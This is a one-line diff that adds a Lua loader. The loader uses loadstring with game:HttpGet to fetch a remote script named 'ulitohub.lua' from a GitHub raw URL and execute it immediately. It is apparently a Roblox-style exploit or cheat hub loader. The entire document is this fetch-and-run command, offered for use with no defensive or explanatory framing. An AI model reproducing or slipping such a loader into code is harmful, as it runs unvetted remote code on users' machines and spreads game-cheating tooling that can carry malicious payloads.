@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ulitooo/fivem/main/ulitohub.lua",true))()
